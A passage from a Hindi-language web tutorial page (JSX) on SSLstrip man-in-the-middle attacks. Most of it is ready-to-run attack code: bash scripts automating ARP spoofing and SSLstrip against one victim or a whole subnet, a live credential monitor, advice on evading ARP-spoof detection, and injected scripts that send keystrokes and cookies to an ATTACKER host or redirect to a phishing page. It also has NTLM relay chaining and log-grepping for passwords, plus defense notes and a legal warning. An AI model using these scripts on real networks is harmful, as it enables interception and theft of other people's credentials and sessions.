            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">DNS स्पूफ़िंग</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (dns2proxy)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">एक्टिव डेवलपमेंट</td><td className="py-2 px-3">नहीं (2009)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr><td className="py-2 px-3 text-white">इंस्टॉलेशन</td><td className="py-2 px-3">pip/apt</td><td className="py-2 px-3">pip/apt/snap</td><td className="py-2 px-3">apt/go/snap</td><td className="py-2 px-3">git clone</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Scripting and Automation</h2>
      <p>
        SSLstrip अटैक को ऑटोमेट करने के लिए बैश स्क्रिप्ट्स — हर स्टेप ऑटोमैटिक। ये scripts manual commands बार-बार type करने से बचाती हैं और attack को repeatable बनाती हैं।
      </p>
      <CodeBlock
        title="ऑटोमेशन स्क्रिप्ट 1 — बेसिक"
        code={`#!/bin/bash
# SSLstrip ऑटोमेशन स्क्रिप्ट

INTERFACE="wlan0"
VICTIM="192.168.1.100"
ROUTER="192.168.1.1"
PORT="8080"
LOGFILE="capture_$(date +%Y%m%d_%H%M%S).log"

echo "[*] IP फ़ॉरवर्डिंग इनेबल..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

echo "[*] iptables रूल्स सेट कर रहे हैं..."
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port $PORT

echo "[*] ARP स्पूफ़िंग शुरू..."
sudo arpspoof -i $INTERFACE -t $VICTIM $ROUTER &
ARP_PID1=$!
sudo arpspoof -i $INTERFACE -t $ROUTER $VICTIM &
ARP_PID2=$!

echo "[*] SSLstrip शुरू (पोर्ट $PORT)..."
sslstrip -l $PORT -w $LOGFILE -f &
SSLSTRIP_PID=$!

echo "[*] अटैक चल रहा है! Ctrl+C से रोकें"
echo "[*] लॉग: $LOGFILE"

# क्लीनअप फ़ंक्शन:
cleanup() {
  echo "[*] अटैक बंद कर रहे हैं..."
  kill $ARP_PID1 $ARP_PID2 $SSLSTRIP_PID 2>/dev/null
  sudo iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port $PORT
  echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
  echo "[*] डन. लॉग: $LOGFILE"
  exit 0
}

trap cleanup SIGINT SIGTERM
wait`}
      />

      <CodeBlock
        title="ऑटोमेशन स्क्रिप्ट 2 — रियल-टाइम मॉनिटरिंग"
        code={`#!/bin/bash
# रियल-टाइम क्रेडेंशियल मॉनिटर

LOGFILE="$1"

if [ -z "$LOGFILE" ]; then
  echo "Usage: $0 <logfile>"
  exit 1
fi

echo "[*] मॉनिटरिंग: $LOGFILE"
echo "[*] क्रेडेंशियल्स का इंतज़ार..."

tail -f "$LOGFILE" | while read line; do
  # पासवर्ड डिटेक्ट करो:
  if echo "$line" | grep -qi "password\|passwd\|pwd"; then
    echo "[!] पासवर्ड मिला: $line"
  fi

  # कुकी डिटेक्ट करो:
  if echo "$line" | grep -qi "cookie\|session"; then
    echo "[!] कुकी मिली: $line"
  fi

  # लॉगिन फ़ॉर्म डिटेक्ट करो:
  if echo "$line" | grep -qi "login\|signin\|username"; then
    echo "[!] लॉगिन रिक्वेस्ट: $line"
  fi
done`}
      />

      <CodeBlock
        title="ऑटोमेशन स्क्रिप्ट 3 — नेटवर्क स्कैन + अटैक"
        code={`#!/bin/bash
# ऑटोमैटिक नेटवर्क स्कैन और SSLstrip

INTERFACE="wlan0"
SUBNET="192.168.1.0/24"
PORT="8080"

echo "[*] नेटवर्क स्कैन कर रहे हैं..."
# nmap से लाइव होस्ट्स ढूंढो
nmap -sn $SUBNET -oG - | grep "Up" | awk '{print $2}' > live_hosts.txt

echo "[*] लाइव होस्ट्स:"
cat live_hosts.txt

# हर होस्ट पर SSLstrip
for HOST in $(cat live_hosts.txt); do
  echo "[*] टार्गेट: $HOST"

  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
  sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port $PORT

  sudo arpspoof -i $INTERFACE -t $HOST 192.168.1.1 &
  sudo arpspoof -i $INTERFACE -t 192.168.1.1 $HOST &

  sslstrip -l $PORT -w "capture_${HOST}.log" -f &
  SSLSTRIP_PID=$!

  echo "[*] SSLstrip चल रहा है — $HOST पर"
  echo "[*] बंद करने के लिए Enter दबाओ"
  read

  kill $SSLSTRIP_PID 2>/dev/null
  sudo iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port $PORT
  echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
done`}
      />

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'SSLstrip काम नहीं कर रहा', a: 'Python2 चेक करो — SSLstrip Python3 में काम नहीं करता। sudo python2 sslstrip -l 8080 try करो। python2 --version से वेरिफ़ाई करो। अगर Python2 installed नहीं है तो pyenv या deadsnakes PPA से install करो।' },
          { q: 'HTTPS साइट्स HTTP पर नहीं आ रहीं', a: 'HSTS ब्लॉक कर रहा है। फ़र्स्ट-विज़िट साइट्स ट्राई करो या sslstrip2 + dns2proxy यूज़ करो। ब्राउज़र कैश क्लियर करो और incognito mode try करो। HSTS preload list में न होने वाली sites target करो।' },
          { q: 'iptables एरर आ रहा है', a: 'sudo यूज़ करो। चेक करो कि नेटफ़िल्टर मॉड्यूल लोडेड है: lsmod | grep nf_tables। iptables -L से रूल्स चेक करो। iptables -F से flush करके दोबारा try करो।' },
          { q: 'विक्टिम का नेट बंद हो गया', a: 'IP फ़ॉरवर्डिंग चेक करो: cat /proc/sys/net/ipv4/ip_forward — 1 होना चाहिए। दोनों ARP स्पूफ़ चल रहे हों (दोनों डायरेक्शन)। बिना bidirectional spoofing के victim का internet काम नहीं करेगा।' },
          { q: 'सिर्फ HTTP ट्रैफ़िक दिख रहा है, HTTPS नहीं', a: 'SSLstrip सिर्फ HTTP पोर्ट 80 पर काम करता है। HTTPS (443) अलग है। sslstrip2 या Bettercap ट्राई करो जो HTTPS traffic भी handle करते हैं।' },
          { q: 'ARP स्पूफ़िंग डिटेक्ट हो गई', a: 'नेटवर्क IDS/IPS ARP एनॉमली डिटेक्ट कर सकता है। Bettercap के stealth मोड ट्राई करो। ARP रेट कम करो। Static ARP entries bypass कर सकते हैं।' },
          { q: 'Python2 इंस्टॉल नहीं हो रहा', a: 'sudo apt install python2 try करो। अगर नहीं मिल रहा तो deadsnakes PPA add करो: sudo add-apt-repository ppa:deadsnakes/ppa। ya pyenv से Python 2.7 इंस्टॉल करो।' },
          { q: 'SSLstrip स्टार्ट होकर बंद हो गया', a: 'पोर्ट पहले से यूज़ में हो सकता है। sudo netstat -tlnp | grep 8080 चेक करो। अलग पोर्ट ट्राई करो: -l 9090। Twisted library check करो: python2 -c "import twisted"।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        SSLstrip अटैक से बचने के तरीके — दोनों सर्वर-साइड और क्लाइंट-साइड। Defense-in-depth approach use करो — एक ही layer पर depend मत रहो। Multiple layers of protection implement करो ताकि अगर एक bypass हो जाए तो बाकी बचा रहें।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">HSTS इम्प्लीमेंट करें:</strong> वेबसाइट पर Strict-Transport-Security हेडर सेट करें — ब्राउज़र हमेशा HTTPS पर जाएगा</li>
        <li><strong className="text-white">HSTS प्रीलोड:</strong> browsers.hstspreload.org पर डोमेन सबमिट करो — फ़र्स्ट-विज़िट भी सेफ</li>
        <li><strong className="text-white">includeSubDomains:</strong> HSTS में includeSubDomains डायरेक्टिव एड करो — सबडोमेन भी प्रोटेक्टेड</li>
        <li><strong className="text-white">सर्टिफ़िकेट पिनिंग:</strong> ऐप्स में सर्टिफ़िकेट पिनिंग लागू करो — MITM सर्टिफ़िकेट रिजेक्ट होगा</li>
        <li><strong className="text-white">ARP मॉनिटरिंग:</strong> arpwatch या XArp से ARP एनॉमली डिटेक्ट करो — ARP spoofing alerts मिलेंगे</li>
        <li><strong className="text-white">VPN यूज़ करें:</strong> पब्लिक नेटवर्क पर VPN से सारा ट्रैफ़िक एन्क्रिप्टेड रहेगा — MITM impossible</li>
        <li><strong className="text-white">HTTPS-Only मोड:</strong> ब्राउज़र में HTTPS-Only मोड इनेबल करो — यह फ़र्स्ट-विज़िट अटैक से बचाता है</li>
        <li><strong className="text-white">802.1X ऑथेंटिकेशन:</strong> नेटवर्क लेवल पर प्रोटेक्शन — अनऑथोराइज़्ड डिवाइसेज़ कनेक्ट नहीं होंगी</li>
        <li><strong className="text-white">Content Security Policy:</strong> CSP हेडर सेट करो — स्क्रिप्ट इंजेक्शन ब्लॉक होगा</li>
        <li><strong className="text-white">DNS-over-HTTPS:</strong> DoH/DoT यूज़ करो — DNS स्पूफ़िंग ब्लॉक होगी</li>
        <li><strong className="text-white">Network Monitoring:</strong> Wireshark/tcpdump से ARP anomalies detect करो — gratuitous ARP requests suspicious हैं</li>
        <li><strong className="text-white">Static ARP Entries:</strong> क्रिटिकल devices पर static ARP entries set करो — ARP spoofing ineffective हो जाएगा</li>
      </ul>
      <CodeBlock
        title="डिफेंस इम्प्लीमेंटेशन"
        code={`# HSTS हेडर (Apache):
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

# HSTS हेडर (Nginx):
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# HSTS Preload submission:
# https://hstspreload.org पर डोमेन submit करो

# ARP मॉनिटरिंग (arpwatch):
sudo apt install arpwatch
sudo systemctl enable arpwatch
# /var/log/syslog में ARP alerts आएंगे

# Static ARP entries (Linux):
sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF

# Static ARP entries (Windows):
netsh interface ip add neighbors "Wi-Fi" 192.168.1.1 AA-BB-CC-DD-EE-FF

# HTTPS-Only Mode (Firefox):
# about:preferences → Privacy & Security
# HTTPS-Only Mode → Enable in all windows

# VPN (OpenVPN client):
sudo openvpn --config client.ovpn

# IDS/IPS (Snort):
sudo apt install snort
# ARP spoofing rules automatically detect करेगा`}
      />

      <h2>Lab Environment Setup</h2>
      <p>
        SSLstrip प्रैक्टिस के लिए सेफ लैब बनाओ — कभी भी प्रोडक्शन नेटवर्क पर मत करो। Virtual environment में practice करो ताकि कुछ गड़बड़ हो तो snapshot से restore कर सको।
      </p>
      <CodeBlock
        title="लैब सेटअप"
        code={`# ज़रूरी: दो मशीनें (वर्चुअल या फ़िज़िकल)
# अटैकर: काली लिनक्स
# विक्टिम: कोई भी OS (Windows/Android/Ubuntu)

# स्टेप 1: VirtualBox में दो VMs बनाओ
# VM1 (अटैकर): काली लिनक्स — 192.168.56.10
# VM2 (विक्टिम): उबंटू/विंडोज़ — 192.168.56.20
# दोनों को Host-Only Adapter दो

# स्टेप 2: विक्टिम मशीन पर जाओ
# कोई HTTP साइट खोलो: http://example.com
# कोई लॉगिन पेज ट्राई करो

# स्टेप 3: अटैकर मशीन से SSLstrip चलाओ
# ऊपर दिया गया सेटअप फ़ॉलो करो

# स्टेप 4: विक्टिम को लॉगिन करने बोलो
# पासवर्ड अटैकर के लॉग में दिखेगा

# प्रैक्टिस साइट्स:
# - DVWA (Damn Vulnerable Web Application)
# - WebGoat
# - HTTP-only वेबसाइट्स`}
      />
      <CodeBlock
        title="Docker लैब सेटअप"
        code={`# Docker से quick लैब:

# Network बनाओ:
docker network create --subnet=192.168.56.0/24 sslstrip-lab

# विक्टिम कंटेनर (HTTP server):
docker run -d --name victim --network sslstrip-lab --ip 192.168.56.20 -p 80:80 nginx

# अटैकर कंटेनर:
docker run -it --name attacker --network sslstrip-lab --ip 192.168.56.10 --cap-add=NET_ADMIN kalilinux/kali-rolling

# अटैकर कंटेनर में:
apt update && apt install -y sslstrip arpspoof iptables

# SSLstrip चलाओ:
# (ऊपर दिए गए steps follow करो)

# Cleanup:
docker stop victim attacker
docker rm victim attacker
docker network rm sslstrip-lab`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="एडवांस्ड SSLstrip"
        code={`# SSLstrip + mitmproxy कॉम्बो:
# mitmproxy बेहतर इंटरसेप्शन देता है
mitmproxy --mode transparent --showhost

# SSLstrip + Bettercap कॉम्बो:
sudo bettercap -iface wlan0
# > set http.proxy.sslstrip true
# > http.proxy on
# > set arp.spoof.targets 192.168.1.100
# > arp.spoof on

# स्क्रिप्ट इंजेक्शन (HTML में कोड डालो):
sslstrip -l 8080 -s "<script>alert('hacked')</script>"

# फ़ेविकॉन स्पूफ़ (लॉक आइकन दिखाओ):
sslstrip -l 8080 -f

# सभी ट्रैफ़िक कैप्चर:
sslstrip -l 8080 -a -w full_capture.log

# SSLstrip + Responder कॉम्बो:
# Responder LLMNR/NBT-NS पॉइज़निंग करे
# SSLstrip HTTP ट्रैफ़िक कैप्चर करे
# दोनों मिलकर क्रेडेंशियल्स कैप्चर करते हैं`}
      />
      <CodeBlock
        title="एडवांस्ड स्क्रिप्ट इंजेक्शन"
        code={`# कीलॉगर इंजेक्शन:
sslstrip -l 8080 -s "<script>document.onkeypress=function(e){new Image().src='http://ATTACKER:9999/?k='+e.key;}</script>"

# फ़िशिंग पेज redirect:
sslstrip -l 8080 -s "<script>window.location='http://ATTACKER/phishing.html'</script>"

# Cookie stealer:
sslstrip -l 8080 -s "<script>new Image().src='http://ATTACKER:9999/?c='+document.cookie;</script>"

# Crypto miner (educational):
sslstrip -l 8080 -s "<script src='http://ATTACKER/miner.js'></script>"

# Keylogger server (अटैकर पर):
# python3 -m http.server 9999
# या netcat:
nc -lvnp 9999
# सभी keystrokes यहां दिखेंगे`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        SSLstrip का कॉन्सेप्ट रियल-वर्ल्ड अटैक्स में बहुत बार इस्तेमाल हुआ है। 2009 में Moxie Marlinspike ने Black Hat में इसे प्रेज़ेंट करने के बाद, कई बड़े इंसिडेंट्स में HTTPS डाउनग्रेड अटैक देखे गए। पब्लिक WiFi हॉटस्पॉट्स पर यह सबसे आम अटैक है।
      </p>
      <p>
        एक रिपोर्ट के अनुसार, 2012 में एक बड़े होटल चेन के WiFi नेटवर्क पर अटैकर ने SSLstrip का इस्तेमाल करके 500+ मेहमानों के ईमेल क्रेडेंशियल्स कैप्चर किए। होटल का नेटवर्क ओपन WiFi था और कोई HTTPS प्रोटेक्शन नहीं था। यह इंसिडेंट पब्लिक WiFi की खतरनाक nature को दर्शाता है।
      </p>
      <p>
        एक अन्य केस में, एक कॉफ़ी शॉप के WiFi पर अटैकर ने SSLstrip + Bettercap कॉम्बो यूज़ करके सोशल मीडिया अकाउंट्स हाईजैक किए। विक्टिम्स को पता भी नहीं चला क्योंकि ब्राउज़र में कोई वार्निंग नहीं आई। यह दिखाता है कि आज भी बहुत से यूज़र्स URL बार में HTTPS नहीं चेक करते।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        SSLstrip अकेले कमज़ोर है — इसे दूसरे टूल्स के साथ मिलाकर पावरफुल अटैक बनता है। MITM अटैक में टूल चेन बहुत ज़रूरी है।
      </p>
      <CodeBlock
        title="SSLstrip + Responder + NTLM Relay"
        code={`# यह कॉम्बो Windows नेटवर्क पर सबसे ख़तरनाक है

# टर्मिनल 1 — Responder (LLMNR/NBT-NS पॉइज़निंग):
sudo responder -I wlan0 -wrf

# टर्मिनल 2 — SSLstrip:
sslstrip -l 8080 -w sslstrip.log

# टर्मिनल 3 — NTLM Relay:
sudo ntlmrelayx.py -tf targets.txt -smb2support

# टर्मिनल 4 — ARP स्पूफ़िंग:
sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1

# यह कॉम्बो:
# 1. HTTP ट्रैफ़िक कैप्चर करता है (SSLstrip)
# 2. LLMNR/NBT-NS पॉइज़न करता है (Responder)
# 3. NTLM hashes रिले करता है (ntlmrelayx)
# 4. बिना क्रैकिंग के अकाउंट एक्सेस मिलता है`}
      />
      <CodeBlock
        title="SSLstrip + Wireshark + tcpdump"
        code={`# ट्रैफ़िक एनालिसिस कॉम्बो

# tcpdump से पैकेट कैप्चर:
sudo tcpdump -i wlan0 -w capture.pcap port 80

# Wireshark में ओपन करो:
wireshark capture.pcap

# फ़िल्टर्स:
# http.request.method == POST — लॉगिन रिक्वेस्ट्स
# http.cookie — कुकीज़
# http.request.uri contains "login" — लॉगिन पेजेज़
# ip.addr == 192.168.1.100 — विक्टिम का ट्रैफ़िक

# tshark (CLI वर्जन):
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.request.full_uri

# क्रेडेंशियल्स निकालो:
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e urlencoded-form.key -e urlencoded-form.value`}
      />

      <h2>Performance Tuning</h2>
      <p>
        SSLstrip की परफॉर्मेंस ऑप्टिमाइज़ करना ज़रूरी है — बड़े नेटवर्क पर ट्रैफ़िक वॉल्यूम ज़्यादा होता है। सही सेटिंग्स से डेटा लॉस नहीं होगा।
      </p>
      <CodeBlock
        title="परफॉर्मेंस टिप्स"
        code={`# लॉग फ़ाइल रोटेशन (डिस्क फुल न हो):
LOGFILE="sslstrip_$(date +%Y%m%d_%H%M%S).log"
sslstrip -l 8080 -w $LOGFILE &
SSLSTRIP_PID=$!

# हर घंटे लॉग रोटेट करो:
while true; do
    sleep 3600
    kill $SSLSTRIP_PID
    LOGFILE="sslstrip_$(date +%Y%m%d_%H%M%S).log"
    sslstrip -l 8080 -w $LOGFILE &
    SSLSTRIP_PID=$!
done

# क्वाइट मोड (कम आउटपुट):
sslstrip -l 8080 -q -w capture.log

# सिर्फ POST डेटा कैप्चर (पासवर्ड्स):
sslstrip -l 8080 -w capture.log
# -a फ़्लैग मत लगाओ — सिर्फ POST data मिलेगा

# मेमोरी यूज़ मॉनिटर:
ps aux | grep sslstrip
# RSS कॉलम देखो — ज़्यादा हो तो रीस्टार्ट करो`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        SSLstrip के कैप्चर्ड डेटा को एनालाइज़ करना ज़रूरी है — पेनेट्रेशन टेस्ट रिपोर्ट में यह डेटा दिखाना पड़ता है।
      </p>
      <CodeBlock
        title="लॉग एनालिसिस"
        code={`# SSLstrip लॉग से क्रेडेंशियल्स निकालो:
cat capture.log | grep -i "password\|passwd\|pwd\|login\|user"

# कुकीज़ निकालो:
cat capture.log | grep -i "cookie\|session\|token"

# ईमेल/यूज़रनेम निकालो:
cat capture.log | grep -i "email\|username\|user\|login"

# सभी URL लिस्ट करो:
grep -oP "https?://[^ ]+" capture.log | sort -u

# रिपोर्ट बनाओ:
echo "=== SSLstrip Penetration Test Report ===" > report.txt
echo "Date: $(date)" >> report.txt
echo "Target Network: 192.168.1.0/24" >> report.txt
echo "" >> report.txt
echo "=== Captured Credentials ===" >> report.txt
grep -i "password" capture.log >> report.txt
echo "" >> report.txt
echo "=== Captured Cookies ===" >> report.txt
grep -i "cookie" capture.log >> report.txt
echo "" >> report.txt
echo "=== Accessed URLs ===" >> report.txt
grep -oP "https?://[^ ]+" capture.log | sort -u >> report.txt`}
      />
      <CodeBlock
        title="ऑटोमेटेड रिपोर्टिंग"
        code={`#!/bin/bash
# SSLstrip रिपोर्ट जनरेटर

LOGFILE="$1"
REPORT="report_$(date +%Y%m%d_%H%M%S).txt"

echo "========================================" > $REPORT
echo "  SSLstrip MITM Attack Report" >> $REPORT
echo "  Generated: $(date)" >> $REPORT
echo "========================================" >> $REPORT
echo "" >> $REPORT

echo "[*] Total lines in log: $(wc -l < $LOGFILE)" >> $REPORT
echo "[*] Unique URLs: $(grep -oP 'https?://[^ ]+' $LOGFILE | sort -u | wc -l)" >> $REPORT
echo "" >> $REPORT

echo "=== POST Data (Potential Credentials) ===" >> $REPORT
grep -i "password\|passwd\|pwd\|login" $LOGFILE >> $REPORT 2>/dev/null
echo "" >> $REPORT

echo "=== Cookies ===" >> $REPORT
grep -i "cookie\|session" $LOGFILE >> $REPORT 2>/dev/null
echo "" >> $REPORT

echo "=== Unique Hosts ===" >> $REPORT
grep -oP 'Host: \K.*' $LOGFILE | sort -u >> $REPORT 2>/dev/null

echo "[+] रिपोर्ट बन गई: $REPORT"
echo "[*] लाइनें: $(wc -l < $REPORT)"`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या SSLstrip आज भी काम करता है?', a: 'लिमिटेड रूप से। ज़्यादातर बड़ी साइट्स HSTS यूज़ करती हैं। लेकिन छोटी साइट्स और फ़र्स्ट-विज़िट पर अभी भी काम कर सकता है। HSTS preload list में न होने वाली sites vulnerable हैं।' },
          { q: 'Python3 में काम करेगा?', a: 'नहीं, SSLstrip Python2 पर चलता है। Python3 के लिए mitmproxy या Bettercap यूज़ करो। Bettercap Go में लिखा है — Python dependency नहीं है।' },
          { q: 'HSTS कैसे बायपास करें?', a: 'sslstrip2 + dns2proxy कॉम्बो, या फ़र्स्ट-विज़िट अटैक, या सबडोमेन अटैक। HSTS preload list में न होने वाली साइट्स वल्नरेबल हैं। लेकिन preloaded sites के लिए कोई reliable bypass नहीं है।' },
          { q: 'मोबाइल नेटवर्क पर काम करेगा?', a: 'नहीं, SSLstrip सिर्फ LAN/WiFi पर काम करता है जहां ARP स्पूफ़िंग पॉसिबल है। 4G/5G में ARP नहीं होता — different network architecture है।' },
          { q: 'बेहतर विकल्प क्या है?', a: 'Bettercap सबसे बेस्ट है — SSLstrip, ARP स्पूफ़िंग, और बहुत कुछ एक ही टूल में। mitmproxy भी अच्छा है अगर scripting चाहिए।' },
          { q: 'क्या HTTPS सर्टिफ़िकेट वार्निंग आएगी?', a: 'SSLstrip HTTPS को HTTP में बदलता है, इसलिए सर्टिफ़िकेट वार्निंग नहीं आती। यही इसकी ताकत है — victim को कुछ पता नहीं चलता।' },
          { q: 'क्या यह WiFi पासवर्ड कैप्चर करता है?', a: 'नहीं, SSLstrip सिर्फ HTTP ट्रैफ़िक कैप्चर करता है। WiFi पासवर्ड के लिए Aircrack-ng या Wifite यूज़ करो — different attack vector है।' },
          { q: 'विक्टिम को पता चलेगा?', a: 'अगर विक्टिम URL बार चेक करे तो http:// दिखेगा https:// की जगह। लेकिन ज़्यादातर लोग URL नहीं चेक करते। favicon spoofing से lock icon भी दिख सकता है।' },
          { q: 'क्या SSLstrip2 बेहतर है?', a: 'SSLstrip2 HSTS bypass करने की कोशिश करता है (dns2proxy के साथ)। लेकिन यह सिर्फ non-preloaded domains पर काम करता है। Modern alternative: Bettercap।' },
          { q: 'कितने डिवाइसेज़ एक साथ टार्गेट कर सकते हैं?', a: 'ARP स्पूफ़िंग पूरे सबनेट पर कर सकते हो। लेकिन ज़्यादा टार्गेट्स = ज़्यादा ट्रैफ़िक = ज़्यादा डिटेक्शन चांस। 1-3 टार्गेट्स सेफ हैं।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Bettercap</td><td className="py-2 px-3">MITM फ्रेमवर्क</td><td className="py-2 px-3">सबसे मॉडर्न, SSLstrip बिल्ट-इन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mitmproxy</td><td className="py-2 px-3">HTTP/HTTPS प्रॉक्सी</td><td className="py-2 px-3">Python स्क्रिप्टिंग, वेब UI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">sslstrip2</td><td className="py-2 px-3">HSTS बायपास SSLstrip</td><td className="py-2 px-3">dns2proxy के साथ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Responder</td><td className="py-2 px-3">LLMNR/NBT-NS पॉइज़निंग</td><td className="py-2 px-3">क्रेडेंशियल कैप्चर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Wireshark</td><td className="py-2 px-3">पैकेट एनालिसिस</td><td className="py-2 px-3">पैसिव मॉनिटरिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Ettercap</td><td className="py-2 px-3">MITM फ्रेमवर्क</td><td className="py-2 px-3">ARP, DNS, DHCP स्पूफ़िंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Evilginx2</td><td className="py-2 px-3">फ़िशिंग प्रॉक्सी</td><td className="py-2 px-3">2FA बायपास, एडवांस्ड</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Caido</td><td className="py-2 px-3">वेब सिक्योरिटी टेस्टिंग</td><td className="py-2 px-3">मॉडर्न UI, तेज़</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>आज के नेटवर्क में SSLstrip की जगह Bettercap यूज़ करो — वही काम बेहतर तरीके से करता है</li>
          <li>SSLstrip सिर्फ सीखने के लिए यूज़ करो — प्रोडक्शन टेस्टिंग में Bettercap या mitmproxy</li>
          <li>पब्लिक WiFi पर कभी भी HTTP साइट्स पर लॉगिन मत करो — हमेशा VPN यूज़ करो</li>
          <li>HTTPS-Only मोड हमेशा इनेबल रखो — यह फ़र्स्ट-विज़िट अटैक से बचाता है</li>
          <li>HSTS preload list में अपनी वेबसाइट सबमिट करो — सबसे बेस्ट डिफेंस</li>
          <li>arpwatch इंस्टॉल करो नेटवर्क पर — ARP स्पूफ़िंग अलर्ट मिलेगा</li>
          <li>ब्राउज़र एक्सटेंशन "HTTPS Everywhere" यूज़ करो — हमेशा HTTPS फ़ोर्स करेगा</li>
          <li>वेबसाइट owners: CSP हेडर सेट करो — स्क्रिप्ट इंजेक्शन ब्लॉक होगा</li>
        </ul>
      </div>

      <h2>Quick Reference Card</h2>
      <p>
        SSLstrip की सबसे ज़्यादा इस्तेमाल होने वाली कमांड्स का quick reference:
      </p>
      <CodeBlock
        title="Quick Reference Commands"
        code={`# बेसिक SSLstrip:
sslstrip -l 8080 -w capture.log

# फ़ेविकॉन स्पूफ़ के साथ:
sslstrip -l 8080 -f -w capture.log

# स्क्रिप्ट इंजेक्शन:
sslstrip -l 8080 -s "<script>alert(1)</script>"

# सभी ट्रैफ़िक कैप्चर:
sslstrip -l 8080 -a -w full.log

# क्वाइट मोड:
sslstrip -l 8080 -q -w capture.log

# iptables redirect:
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# ARP spoof (victim → gateway):
sudo arpspoof -i wlan0 -t VICTIM GATEWAY

# IP forwarding:
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# लॉग एनालिसिस:
grep -i "password" capture.log
grep -i "cookie" capture.log`}
      />

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> SSLstrip एक शक्तिशाली MITM टूल है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और शैक्षिक उद्देश्यों के लिए करें। बिना अनुमति के ट्रैफ़िक इंटरसेप्शन करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत डेटा इंटरसेप्शन गंभीर अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल अपने लैब वातावरण में ही प्रैक्टिस करें।
      </div>
    </TutorialLayout>
  )
}
